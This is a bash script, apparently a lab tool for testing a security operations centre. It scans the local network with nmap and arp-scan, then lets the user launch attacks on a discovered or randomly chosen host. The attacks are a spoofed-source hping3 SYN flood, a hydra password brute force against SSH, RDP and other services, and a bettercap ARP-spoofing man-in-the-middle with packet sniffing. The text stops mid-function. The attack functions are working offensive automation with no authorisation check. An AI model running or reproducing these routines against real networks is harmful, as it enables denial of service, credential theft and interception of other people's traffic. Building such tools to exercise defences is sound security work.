#!/bin/bash

# Remember to change shebang when running the script to #! /bin/sh (VIM color corruption)
# # Remember to change shebang when editing the script to #! /bin/bash (VIM color corruption)


# //////
# Banner
# //////

logo=$(cat << "BANNER"


ooooooooooooo oooooooooooo  .oooooo..o ooooooooooooo
8'   888   `8 `888'     `8 d8P'    `Y8 8'   888   `8
     888       888         Y88bo.           888
     888       888oooo8     `"Y8888o.       888
     888       888    "         `"Y88b      888
     888       888       o oo     .d8P      888
    o888o     o888ooooood8 8""88888P'      o888o

Made by L.Y.H

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BANNER
)

# ///////
# Visuals
# ///////

BoR='\033[30;41m' # Black on Red
BoG='\033[30;42m' # Black on Green

NEU='\033[0m' # Neutral

# ///////////
# Global Vars
# ///////////

host_ip="$(ip a | grep brd | grep inet | awk '{print $2}' | sed 's![/].*$!!')" # Host's IP addr
host_SM="$(ip a | grep brd | grep inet | awk '{print $2}' | sed 's!.*[/]!!')" # Host's network Subnet Mask (CIDR)
net_addr_SM="$(ip r | grep -v default | awk -v var=$host_ip '$(NF-2=="var")' | awk '{print $1}')" # Network addr + CIDR
DG_addr="$(ip r | grep default | awk '{print $3}')" # Default Gateway address

target_hosts=() # List containing all target hosts discovered

cli_h="$(tput lines)" # Height of terminal
cli_w="$(tput cols)" # Width of terminal


range10='^10\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])$'
range192='^192\.168\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])$'
range172='^172\.(1[6-9]|2[0-9]|3[0-1])\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([0-9]{1,2}|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])$'

fold="./.SOC_fold"
date_str="$(date +"%d%m%Y_%H%M")"
log_file="/var/log/SOC_Checker.log"

# ////////////////////////
# Descriptions & Templates
# ////////////////////////

SYN_Flood_Desc="""A SYN-flood attack, (T1499.0021) is a type of Denial-of-Service (DoS) attack that exploits the TCP handshake process.
The attacker sends a large number of SYN (synchronize) packets to a target system, each appearing to come from a different IP address.
This overwhelms the target’s ability to respond to legitimate traffic, effectively making the system or service unavailable.
It’s a significant threat to network security as it can disrupt services and cause downtime.
"""

BruteForce_Desc="""Bruteforce (T1110) is a catagory of attacks used to getting access to accounts by trail and error.
Attackers may use bruteforce when they discovered a valid username, but they still lack the password.
Bruteforce attacks consist of systamatically guessing the password using a repetitive or iterative mechanism.
"""

MitM_Desc="""Adversary/Man-in-the-Middle (A/MitM) (T1557) is a technique that allows malicious actors to position themselves in between two or more network devices by abusing common networking protocols such as ARP and DNS. 
Whether listening to ARP requests on the network or flooding it with ARP replies, a malicious actor can trick devices in the network into sending data through him by telling them the Default Gateway's MAC address is actually the attacker's MAC (see ARP Cache Poisoning - T1557.002).
Malicious actors may use A/MitM in order to set up other attacks such as Network Sniffing, Transmitted Data Manipulation and Replay Attacks.
"""



# /////////
# Functions
# /////////



# ~~~~~~~~~~~~~~~
# Child Functions
# ~~~~~~~~~~~~~~~

clr() {
	tput rc
	tput ed
}

Find_Range_Type() {
	if [[ "$host_ip" =~ $range10 ]]; then # 10.X.X.X
		echo -e "1"
	elif [[ "$host_ip" =~ $range192 ]]; then # 192.168.X.X
		echo -e "2"
	elif [[ "$host_ip" =~ $range172 ]]; then # 172.16-32.X.X
		echo -e "3"
	fi
}

# Will install any missing packages there might be.
# Arguments: missing_tools
Install_dependencies() {
	local missing=("$@")
	echo -e "[*] Attempting to install the missing packages..."
	for mia in "${missing[@]}"; do
		echo -e "	[*] Installing $mia..."
		apt-get install $mia -y &> /dev/null
		echo -e "	[*] Finished installing $mia!"
	done
	echo -e "\n[!] All missing packages have been installed!\n"
	sleep 3 # Static delay for visibility.
}

Verify_fit_range_type() {
	input="$1"
	if ([[ "$range_type" -eq 1 ]] && [[ "$input" =~ $range10 ]]) || ([[ "$range_type" -eq 2 ]] && [[ "$input" =~ $range192 ]]) || ([[ "$range_type" -eq 3 ]] && [[ "$input" =~ $range172 ]]); then
		return 0
	else
		return 1
	fi
}

range_type=$(Find_Range_Type)


# This function will generate log entries to be written in /var/log/SOC_Checker.log.
# Arguments: action_type (scan, attack, etc), state (start, stop), data
Log_entries() {
	action="$1"
	state="$2"
	data="$3"
	case $action in
		"host" | "port" | "ARP")
			echo -e "$(date +"%b %d %Y %H:%M:%S (%Z)") : $state $action scan on $data" >> $log_file # Where $data == "target_range" || "$(IPs.txt | wc -l) hosts"  || "net_addr/CIDR network"
			;;
		"SYN-Flood" | "BruteForce")
			read -r ip port <<< $(echo -e "$data" | sed 's/:/ /g')
			echo -e "$(date +"%b %d %Y %H:%M:%S (%Z)") : $state $action attack on $ip on port $port" >> $log_file # Where $data == target_ip:target_port
			;;
		"MitM")
			echo -e "$(date +"%b %d %Y %H:%M:%S (%Z)") : $state $action attack on $data" >> $log_file # Where $data == target_ip
			;;
	esac

}

# Credit : https://stackoverflow.com/a/27151152
# Credit : https://stackoverflow.com/a/6149254
# Credit : https://stackoverflow.com/a/13280173
Calc_range() {
	#echo -e "[*] calc_range activated with values $1 and $2"
	first="$(echo -e "$1" | sed 's/[^.]*$/0/')"
	last="$(echo -e "$2" | sed 's/[^.]*$/255/')"
	#echo -e "[*] $first || $last"
	first_sep="$(echo ${first//./ })"
	last_sep="$(echo ${last//./ })"
	#echo -e "[*] ${first_sep[1]}.${first_sep[0]}.${last_sep[3]}.${last_sep[1]}" # not indexed, just strs
	first_hex="$(printf '%02X' $first_sep)"
	last_hex="$(printf '%02X' $last_sep)"
	first_des=$((16#$first_hex))
	last_des=$((16#$last_hex))
	echo -e "$(($last_des-$first_des+1))"
}

# This function will output a target range for nmap to scan based on the given start and end addresses given. Beats creating a list with all possible addresses IMO.
# Don't ask how long this shit took...
Test_nmap_range_input() {
	first="$(echo -e "$1" | sed 's/[^.]*$/0/')"
	last="$(echo -e "$2" | sed 's/[^.]*$/255/')"
	first_oct=()
	last_oct=()
	if [[ "$first" == "0.0.0.0" ]] && [[ "$last" == "0.0.0.255" ]]; then
		if [[ "$range_type" == 1 ]]; then
			echo -e "10.0-255.0-255.0-255"
		elif [[ "$range_type" == 2 ]]; then
			echo -e "192.168.0-255.0-255"
		elif [[ "$range_type" == 3 ]]; then
			echo -e "172.16-31.0-255.0-255"
		fi
	else
		for i in $(echo -e "$first" | sed 's/\./ /g'); do
			first_oct+=("$i")
		done
		for i in $(echo -e "$last" | sed 's/\./ /g'); do
			last_oct+=("$i")
		done
		if [[ "$range_type" == 2 ]]; then # If range_type fits 192 template
			if [[ "${first_oct[2]}" == "${last_oct[2]}" ]]; then
				echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}.0-255"
			else
				echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}-${last_oct[2]}.0-255"
			fi
		else # If range_type fits either 10 or 172 templates
			if [[ "${first_oct[1]}" == "${last_oct[1]}" ]] && [[ "${first_oct[2]}" == "${last_oct[2]}" ]]; then
				echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}.0-255"
			elif [[ "${first_oct[1]}" == "${last_oct[1]}" ]] && [[ ! "${first_oct[2]}" == "${last_oct[2]}" ]]; then
				echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}-${last_oct[2]}.0-255"
			elif [[ ! "${first_oct[1]}" == "${last_oct[1]}" ]] && [[ "${first_oct[2]}" == 0 ]] && [[ "${last_oct[2]}" == 255 ]]; then
				echo -e "${first_oct[0]}.${first_oct[1]}-${last_oct[1]}.0-255.0-255"
			#elif [[ ! "${first_oct[1]}" == "${last_oct[1]}" ]] && [[ "${first_oct[2]}" == 0 ]] && [[ "${last_oct[2]}" == 255 ]]; then
			else
				#echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}-255.0-255"
				echo -e "${first_oct[0]}.${first_oct[1]}.${first_oct[2]}-255.0-255,${first_oct[0]}.${last_oct[1]}.0-${last_oct[2]}.0-255,${first_oct[0]}.$((${first_oct[1]}+1))-$((${last_oct[1]}-1)).0-255.0-255"
				#echo -e "${first_oct[0]}.${last_oct[1]}.0-${last_oct[2]}.0-255"
				#echo -e "${first_oct[0]}.$((${first_oct[1]}+1))-$((${last_oct[1]}-1)).0-255.0-255"
			fi
		fi
	fi
}

# Child func for executing a DoS attack with hping3
# Takes the args: target, port, duration
Exec_SYN_Flood() {
	target="$1"
	port="$2"
	duration="$3"
	echo -e "[*] Initiating SYN flood DoS attack on target for $duration seconds!"
	Log_entries "SYN-Flood" "Started" "$target:$port"
	timeout $duration hping3 -S -p $port $target --flood --rand-source # With spoofing source addr
	Log_entries "SYN-Flood" "Ended" "$target:$port"
	echo -e "[*] Finished SYN flood DoS attack"
}

# Child func for executing a bruteforce attack on a target with hydra
# Takes the args: target, port, service, uname/ufile, pword/pfile, duration
Exec_BruteForce() {
	target="$1"
	port="$2"
	service="$3"
	uname="$4"
	pword="$5"
	duration="$6"
	threads=0

	if [[ "$service" == "ms-wbt-server" ]]; then # Tometo-tomato issue, making a little twik.
		service="rdp"
	fi
	
	# Check the service and apply threads accordingly (4 for ssh, 16 (default) for the rest).
	if [ "$service" == "ssh" ]; then
		threads=4
	else
		threads=16
	fi

	# Create lines for the command to fit if the user chose a username/password, or files.
	if [ -f "$uname" ]; then
		#echo -e "[*] File detected!" #Debugging
		uline="-L $uname"
	else
		uline="-l $uname"
	fi
	if [ -f "$pword" ]; then
		#echo -e "[*] File detected!"#Debugging
		pline="-P $pword"
	else
		pword="-p $pword"
	fi
	
	echo -e "[*] Executing Bruteforce attack on $target..."
	Log_entries "BruteForce" "Started" "$target:$port"
	if [[ "$duration" == "0" ]]; then
		hydra -I $uline $pline $service://$target -s $port -t $threads &> /dev/null # W/O timer on execution.
	else
		timeout $duration hydra -I $uline $pline $service://$target -s $port -t $threads &> /dev/null # With timer on execution.
	fi
	Log_entries "BruteForce" "Ended" "$target:$port"
	echo -e "[*] Finished Bruteforce attack on $target!"
}

# Child func for executing a MitM attack on the target (probably with bettercap)
# Currently a dummy function as I'm thinking of how to implement it in practice, while also using a new tool
# Currently, Doesn't take any args for testing purposes; will update args later...
# Temp args : target_ip
Exec_MitM() {
	target_ip="$1"
	# Check if the ip_forward is 1, if not change it:
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" -eq 0 ]; then
		echo -e "[*] Setting /proc/sys/net/ipv4/ip_forward to 1"
		echo 1 > /proc/sys/net/ipv4/ip_forward
	else
		echo -e "[*] /proc/sys/net/ipv4/ip_forward is already set to 1"
	fi

	# Create a caplet file
	caplet_template="""set arp.spoof.fullduplex true
	set arp.spoof.targets $target_ip
	arp.spoof on
	net.sniff
	"""
	capfile_name="MitM_${target_ip}.cap"
	if [ -f "./${fold}/${date_str}/${capfile_name}" ]; then
		echo -e "[*] Caplet file for the target IP already exists. Using it."
	else
		echo -e "$caplet_template" > ${fold}/${date_str}/${capfile_name}
		echo -e "[*] Generated caplet file for target IP."
	fi

	# Before running the attack, include 5 sec delay and notify user to press q to stop the attack
	echo -e "[*] Starting MitM attack in 5 seconds..."
	echo -e "[!] Press q at any point to stop the attack [!]"
	sleep 5

	# Start running the MitM attack with the caplet file
	Log_entries "MitM" "Started" "$target_ip"
	bettercap -caplet ./${fold}/${date_str}/${capfile_name} &> /dev/null &
	bettercap_pid=$!
	while [ -d /proc/${bettercap_pid} ]; do
		read -rsn1 -t0.5 trigger
		if [ "${trigger,,}" == "q" ]; then
			kill $bettercap_pid &> /dev/null
		fi
	done
	Log_entries "MitM" "Ended" "$target_ip"

	echo -e "[*] MitM attack has been terminated!"
}

# ~~~~~~~~~~~~~~~~
# Parent Functions
# ~~~~~~~~~~~~~~~~

# Checks if the user running the script is root / using sudo permissions.
Root_Check() {
	if [ "$(id -u)" -ne 0 ]; then
		echo -e "[!] Script requires sudo permissions to run.\n[!] Aborting!"
		exit
	fi
}

# Checks if all the necissery tools are installed and if not the script will install them.
Check_dependencies() {
	tools=(hydra bettercap nmap netmask hping3 arp-scan coreutils) # timeout) # coreutils == timeout; timeout left for testing, need to get a new package for testing the installation section.
	missing_tools=()
	local str=""
	local res=""
	for tool in "${tools[@]}"; do
		str+="^$tool\$\\|"
	done
	str=${str%\\|}
	res="$(dpkg -l | awk '{print $2}' | grep -w "$str")"
	echo -e "[*] Checking required packages..."
	for tool in "${tools[@]}"; do
		if $(echo -e "$res" | grep -wq "$tool"); then
			echo -e "	[+] $tool is installed!"
		else
			echo -e "	[-] $tool is NOT installed!"
			missing_tools+=($tool)
		fi
	done
	if [[ ${#missing_tools[@]} -gt 0 ]]; then
		echo -e "	[!] Not all required packages are installed!"
		echo -e "	[!] The $(if [[ ${#missing_tools[@]} -eq 1 ]]; then echo "following package is"; else echo -e "following ${#missing_tools[@]} packages are"; fi) not installed:"
		for missing_tool in "${missing_tools[@]}"; do
		       echo -e "	[-] $missing_tool"
	       	done
		while true; do
			echo -e "\nWould you like to install them? [y/N]"
			read -p "Input> " option
			if [[ "${option,,}" == "n" ]] || [[ -z $option ]]; then
				echo -e "\n[!] Not all of the required packages are installed.\n[!] Aborting!"
				exit
			elif [[ "${option,,}" == "y" ]]; then
				Install_dependencies "${missing_tools[@]}"
				break
			else
				:
			fi
		done
	else
		printf "\e[9A$(tput ed)"
		echo -e "[*] All required packages are already installed!"
	fi
}

# Creating the .SOC_fold dir, log file and date_str dir (if they don't exist).
# Will run after Check_dependencies inside main
Initial_setup() {
	if ! [ -f $log_file ]; then
		touch $log_file
		echo -e "[*] Created the file $log_file!"
	else
		echo -e "[*] $log_file already exists!"
	fi
	if ! [ -d "${fold}" ]; then
		mkdir .SOC_fold
		echo -e "[*] Created .SOC_fold dir!"
	else
		echo -e "[*] .SOC_fold already exists!"
	fi
	if ! [ -d "${fold}/${date_str}" ]; then
		mkdir ${fold}/${date_str}
		echo -e "[*] Created ${fold}/${date_str} dir!"
	else
		echo -e "[!] The dir ${fold}/${date_str} already exists!"
	fi
}

# Hub function for all scaning processes from the menu.
Advanced_Scan() {
	scan_type="$1" # "Network", "Host", "Nuke"
	net_start="$2"
	net_end="$3"
	scan_ranges=""
	# I think I can get rid of the $scan_type variable, since both "Nuke" and "Host" interact exactily the same way with the Test_nmap_range_input func.
	if [[ "$scan_type" == "Nuke" ]]; then
		scan_ranges="$(Test_nmap_range_input "$net_start" "$net_end")"
		#echo -e "$scan_ranges"
		#Nuke_scan
		#nmap -PP -PE -PM -n -sn
	elif [[ "$scan_type" == "Host" ]]; then
		#Host_scan "$net_start" "$net_end"
		scan_ranges="$(Test_nmap_range_input "$net_start" "$net_end")"
	elif [[ "$scan_type" == "Network" ]]; then
		echo -e "PROTOTYPE PLACEHOLDER!"
	fi
	#nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 | awk --posix '$NF ~ /^172\.16\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})/ {print $NF}' >> tmp_Hosts_IP.txt
	if [[ "$range_type" == 1 ]]; then
		awk_regex="$(echo -e "$range10" | sed 's/\\/\\\\/g' | sed 's/\$//')"
		#awk_regex=$range10
	elif [[ "$range_type" == 2 ]]; then
		awk_regex="$(echo -e "$range192" | sed 's/\\/\\\\/g' | sed 's/\$//')"
	elif [[ "$range_type" == 3 ]]; then
		awk_regex="$(echo -e "$range172" | sed 's/\\/\\\\/g' | sed 's/\$//')"
		#awk_regex='^172\\.16\\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})\\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})'
	fi
	# TESTING: added "--exclude $host_ip" to nmap command to see how it interacts with the script as a whole!
	#nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 | awk -v regi="$awk_regex" --posix '$NF ~ regi {print $NF}' >> ${fold}/${date_str}/IPs.txt
	#echo -e "$scan_ranges" # DEBUGGING
	echo -e "[*] Started host scan. This might take a while..."
	Log_entries "host" "Started" "$scan_ranges"
	nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 --exclude $host_ip | awk -v regi="$awk_regex" --posix '$NF ~ regi {print $NF}' >> ${fold}/${date_str}/IPs.txt
	Log_entries "host" "Ended" "$scan_ranges"
	printf "\e[1A$(tput ed)" # Remove the "This might take a while" message after scan completion.
	#echo -e "[*] Scan completed! discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts! (including this host)"
	#echo -e "[*] Scan completed! discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts!"

}

# Very basic function - just run arp-scan and return all the discovered hosts and store them in IP.txt
# Doesn't take any args.
# Honestly, quite a useless function, but I'd hate to ruin the current flow of the script...
Subnet_Scan() {
	Log_entries "ARP" "Started" "$net_addr_SM network"
	arp-scan $net_addr_SM | awk '$1 ~ /([0-9]{1,3}\.){3}[0-9]{1,3}/ {print $1}' >> ${fold}/${date_str}/IPs.txt
	Log_entries "ARP" "Ended" "$net_addr_SM network"
}

# Main func for the Info Gathering section of the script
Info_Gathering() {
	NSE_scripts=""
	if [ $2 -eq 0 ] && [ $3 -eq 0 ] && [ $4 -eq 0 ]; then
		NSE_scripts=""
	else
		NSE_scripts="--script=$(if [ $2 -eq 1 ]; then echo -n "auth"; else echo -n ""; fi),$(if [ $3 -eq 1 ]; then echo -n "vuln"; else echo -n ""; fi),$(if [ $4 -eq 1 ]; then echo -n "version"; else echo -n ""; fi)"
	fi
	ports_2_scan="$1"
	echo -e "[*] Starting port and services scans on the discovered active hosts. This might take a while..."
	# Start scanning the discovered IPs for ports and services
	#nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt --script=auth,vuln,version -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt --exclude $host_ip &> /dev/null
	#nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt --script=auth,vuln,version -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt &> /dev/null
	Log_entries "port" "Started" "$(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts"
	nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt $NSE_scripts -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt &> /dev/null
	Log_entries "port" "Ended" "$(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts"
	printf "\e[1A$(tput ed)"
	echo -e "[*] Port and service scan completed!"

	# Create a new file from grepable.txt that will include all the IPs, ports and services in a servicable manner
	while read line; do
		target_IP="$(echo -e "$line" | awk '{print $2}')"
		while read target_port; do
			echo -e "$target_IP $target_port" >> ${fold}/${date_str}/simp.txt
		done <<<$(echo -e "$line" | sed 's/\(.*\)\t//' | sed 's/Ports://' | sed 's/,/\n/g') # This line causes color corruption errors when the shebang is /bin/sh; forced to use /bin/bash for editing/testing for now...
	done <<<$(cat ${fold}/${date_str}/grepable.txt | grep -v "# Nmap" | grep -v "# Ports scanned\|Status" | sed 's/\(.*\)\t/\1\n /' | grep -v "Ignored State") # IDE issues when displaying the same line commented above.

}

# Main func for the Attacking section of the script
# Takes target_ip and selected_attack (1/2/3)
Attacking() {
	target_ip="$1"
	selected_attack="$2" # 1 == SYN_Flood | 2 == Bruteforce | 3 == MitM
	if [ "$selected_attack" == "SYN-Flood" ]; then
		Basic_menu_SYN_Flood "$target_ip"
	elif [ "$selected_attack" == "Bruteforce" ]; then
		Basic_menu_Bruteforce "$target_ip"
	elif [ "$selected_attack" == "MitM" ]; then
		Exec_MitM "$target_ip"
	fi
}

# ~~~~~~~~~~~~~~
# Menu Functions
# ~~~~~~~~~~~~~~


Basic_menu2_2() {
	#echo -e "Please select one of the following options:\n	1. Scan entire network\n	2. Scan specific range in network\n	3. Go back to previous menu\n" # RETIRED, keep for reference just in case
	ERR_MSG=""
	echo -e ""
	tput sc
	while true; do
		echo -e "Please select where to scan for possible hosts:\n	1. Set scan range manually\n	2. Scan in subnet (Arp-scan)\n	3. Scan entire network\n\n$ERR_MSG\n"
		read -p "Input> " option
		if [[ "$option" -eq 1 ]]; then
		#	printf "\e[8A$(tput ed)"
			clr
			if Basic_menu3_2; then
				break
			else
				ERR_MSG=""
				continue
			fi
		elif [[ "$option" -eq 2 ]]; then
			clr
		#	printf "\e[8A$(tput ed)"
			Subnet_Scan
			break
		elif [[ "$option" -eq 3 ]]; then
			clr
		#	printf "\e[8A$(tput ed)"
			Advanced_Scan "Nuke" "0.0.0.0" "0.0.0.0"
			break
		else
			ERR_MSG="Bad input!"
		#	printf "\e[8A$(tput ed)"
			clr
			continue
		fi
	done
	#tput rc; tput ed
	#sleep 5
	echo -e "[*] Scan completed! Discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts!"
}

# Make sure the 4th octat will be * in the default options and after the user sets an option.
Basic_menu3_2() {
	#sleep 5 # Debugging
	ERR_MSG=""
	ex_status=""
	Network_scan_start=""
	Network_scan_end=""
	if [[ "$range_type" == 1 ]]; then
		Network_scan_start="10.0.0.*"
		Network_scan_end="10.0.100.*"
	elif [[ "$range_type" == 2 ]]; then
		Network_scan_start="192.168.0.*"
		Network_scan_end="192.168.100.*"
	elif [[ "$range_type" == 3 ]]; then
		Network_scan_start="172.16.0.*"
		Network_scan_end="172.16.100.*"
	fi
	tput sc
	while true; do
		echo -e "Please set your desired options:\n	1. Starting network : $Network_scan_start\n	2. Ending network : $Network_scan_end\n	3. Start scanning ($(Calc_range $Network_scan_start $Network_scan_end) IP Addresses)\n	4. Go back to previous menu\n\n$ERR_MSG\n"
		read -p "Input> " option
		options=()
		for opt in $(echo -e "$option"); do
			options+=("$opt")
		done
		#printf "\e[7A$(tput ed)"
		clr
		#echo -e "${options[0]} | ${options[1]}" # DEBUGGING
		if [[ "${options[0]}" == 1 ]]; then
			if [[ -z "${options[1]}" ]]; then
				ERR_MSG="ERROR : Bad usage. No IP address was given (ex: 1 <IP_ADDR>)."
			elif Verify_fit_range_type "$(echo -e "${options[1]}" | sed 's/[^.]*$/0/')"; then
				Network_scan_start="$(echo -e "${options[1]}" | sed 's/[^.]*$/\*/')"
				ERR_MSG=""
			else
				ERR_MSG="ERROR : Given IP address does not match your network address template!"
			fi
		elif [[ "${options[0]}" == 2 ]]; then
			if [[ -z "${options[1]}" ]]; then
				ERR_MSG="ERROR : Bad usage. No IP address was given (ex: 2 <IP_ADDR>)."
			elif Verify_fit_range_type "$(echo -e "${options[1]}" | sed 's/[^.]*$/0/')"; then
				Network_scan_end="$(echo -e "${options[1]}" | sed 's/[^.]*$/\*/')"
				ERR_MSG=""
			else
				ERR_MSG="ERROR : Given IP address does not match your network address template!"
			fi
		elif [[ "${options[0]}" == 3 ]]; then
			Advanced_Scan "Host" "$Network_scan_start" "$Network_scan_end"
			ex_status=0
			break
		elif [[ "${options[0]}" == 4 ]]; then
			ERR_MSG=""
			# I can make Basic_menu2_2 work as a while-loop, and have this option return an irregual exit status to cause stop this func and return to the previous menu...
			ex_status=1
			break
		else
			ERR_MSG="Bad input!"
		fi
	done
	return $ex_status
}

Basic_menu_port_scan() {
	target_ip_cnt="$(cat ./${fold}/${date_str}/IPs.txt | wc -l)"
	#target_ip_cnt="3" # DEBUGGING
	ERR_MSG=""
	NSE_status=(0 1 0) # auth,vuln.version; 0=OFF 1=ON
	tput sc
	while true; do
		NSE_Display="auth:@|vuln:@|version:@"
		for i in ${NSE_status[@]}; do
			if [[ $i -eq 0 ]]; then
				NSE_Display="$(echo -e "$NSE_Display" | sed 's/\@/\'"${BoR}OFF"'\'"${NEU}"'/')"
			else
				NSE_Display="$(echo -e "$NSE_Display" | sed 's/\@/\'"${BoG}ON"'\'"${NEU}"'/')"
			fi
		done
		echo -e "Please select the amount of ports you with to scan (per target):\n	1. Top 100 ports (total:$(($target_ip_cnt * 100)))\n	2. Top 1000 ports (total:$(($target_ip_cnt * 1000)))\n	3. All 65535 ports (total:$(($target_ip_cnt * 65535)))\n	4. Set number of top ports\n	5. Activate/Deactivate NSEs : $NSE_Display\n\n$ERR_MSG\n"
		read -p "Input> " option
		options=()
		for opt in $(echo -e "$option"); do
			options+=("$opt")
		done
		#printf "\e[9A$(tput ed)"
		clr
		if [ "${options[0]}" == "1" ]; then
			ports_2_scan="-F"
			break
		elif [ "${options[0]}" == 2 ]; then
			ports_2_scan=""
			break
		elif [ "${options[0]}" == 3 ]; then
			#ports_2_scan="poor soul"
			ports_2_scan="-p-"
			break
		elif [ "${options[0]}" == 4 ]; then # Remove or fix - causes issues with simp.txt (see 03012024_0816)
			if [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
				ports_2_scan="--top-ports ${options[1]} --open" # Tecnically solves 03012024_0816 (?)
				break
			else
				ERR_MSG="ERROR : Option only accepts numbers as values (ex: 4 69, 4 420, etc)"
				continue
			fi
		elif [ "${options[0]}" == 5 ]; then
			if [[ "${options[1]}" =~ ^[0-1][0-1][0-1]$ ]]; then
				for ((i=0;i<${#options[1]};i++)); do
					char=${options[1]:i:1}
					NSE_status[$i]=$char
				done
				ERR_MSG=""
			else
				ERR_MSG="ERROR : Option only accepting 3 chars of 1's and 0's (ex: 5 000, 5 111, 5 010, etc)"
			fi
		else
			ERR_MSG="Bad input!"
			continue
		fi
	done
	# Add line to run Info_Gathering with arg of ports to scan
	# Add a variable to transfer the NSEs + add to Info_Gathering a way of using the new var to change "--scripts" in nmap command. 
	Info_Gathering "$ports_2_scan" ${NSE_status[0]} ${NSE_status[1]} ${NSE_status[2]}

}

# Let the user select a target to attack (also allow them to view the targets via different menu/func)
Basic_menu4() {
	echo -e "" # * ~ S P A C E ~ *
	while true; do # Extra while loop, re-runs test
	selected_target=""
	err_msg=""
	tput sc
	while true; do
		echo -e "Please select one of the following options:\n	1. Select specific target to attack\n	2. Choose a random target to attack\n	3. View all discovered targets\n\n$err_msg\n"
		read -p "Input> " option
		options=()
		for opt in $(echo -e "$option"); do
			options+=("$opt")
		done
		#printf "\e[8A$(tput ed)"
		clr
		if [[ "${options[0]}" == 1 ]]; then
			if [[ -z "${options[1]}" ]]; then
				err_msg="ERROR : Please input both the option number (1) + the target address!"
			elif ! [[ "${options[1]}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
				err_msg="ERROR : given input does not match IP template!"
			elif $(cat ${fold}/${date_str}/simp.txt | awk '{print $1}' | grep -qw "${options[1]}"); then # If the given input is a target address that exists in simp.txt:
			#elif $(cat $tmp_file_path | awk '{print $1}' | grep -q "${options[1]}"); then # DEBUGGING
				#echo -e "PLACEHOLDER - MOVE TO THE NEXT MENU"
				selected_target="${options[1]}"
				break
			else
				err_msg="ERROR : Given target was not discovered in our scan. Please select a target from the list."
			fi
		elif [[ "${options[0]}" == 2 ]]; then
			selected_target="$(shuf -n 1 ${fold}/${date_str}/simp.txt | awk '{print $1}')" # By using shuf on simp.txt, we increase the chances that a target with more ports will be selected, rather than the odds being equal to every target.
			#selected_target="$(shuf -n 1 $tmp_file_path | awk '{print $1}')" # DEBUGGING
			break
		elif [[ "${options[0]}" == 3 ]]; then
			Basic_menu_tar
			err_msg=""
		fi
	done
	#Basic_menu5 "$selected_target"
	if Basic_menu5 "$selected_target"; then break; fi
	clr
	printf "\e[1A$(tput ed)" # Since it seems that the "Selected target IP" output is still there... Perhaps the clr in this instance is returning to the last tput sc command (which is in the attack menus).
	done # Extra while loop, re-runs test
}

# Let the user select an attack to run on the target they selected from the previous menu
# Make sure to only display attacks that can be executed on the given target; if the target lacks a certain service, don't display any attack for that service
Basic_menu5() {
	ex_status=""
	target_ip="$1"
	#target_ip="1.1.1.1" # DEBUGGING
	ERR_MSG=""
	echo -e "[!] Selected target IP : $target_ip"
	tput sc
	while true; do
		#echo -e "[!] Selected target IP : $target_ip\n[*] Please select an attack:\n	1. SYN-Flood\n	2. Bruteforce\n	3. MitM\n	0. Go back to previous menu\n\n$ERR_MSG\n"
		echo -e "[*] Please select an attack:\n	1. SYN-Flood\n	2. Bruteforce\n	3. MitM\n	0. Go back to previous menu\n\n$ERR_MSG\n"
		read -p "Input> " option

		case $option in
			"1" | "2" | "3")
				#printf "\e[9A$(tput ed)"
				printf "\e[1A$(tput ed)" # Removes the input field.
				ERR_MSG=""
				attack_name=""
				if [ $option -eq 1 ]; then attack_name="SYN-Flood"
				elif [ $option -eq 2 ]; then attack_name="Bruteforce"
				elif [ $option -eq 3 ]; then attack_name="MitM"
				fi
				if Display_Desc $option; then clr; Attacking "$target_ip" "$attack_name"
				else clr; continue
				fi
				;;
			"0")
				ex_status=1
				clr
				#printf "\e[10A$(tput ed)"
				printf "\e[1A$(tput ed)" # Also delete the IP addr
				;;
			*)
				#printf "\e[9A$(tput ed)"
				clr
				ERR_MSG="[!] Invalid input!"
				continue
				;;
		esac
		break
	done
	if [[ -z "$ex_status" ]]; then
		echo -e "Would you like to run another attack? [Y/n]\n"
		read -p "Input> " option
		case $option in
			"N" | "n")
				ex_status=0
				;;
			"Y" | "y")
				ex_status=1
				;;
			*)
				ex_status=1
				;;
		esac
	fi
	return $ex_status
}

Display_Desc() {
	des=$1
	if [ $des -eq 1 ]; then
		#lines="11"
		echo -e "$SYN_Flood_Desc\n"
	elif [ $des -eq 2 ]; then
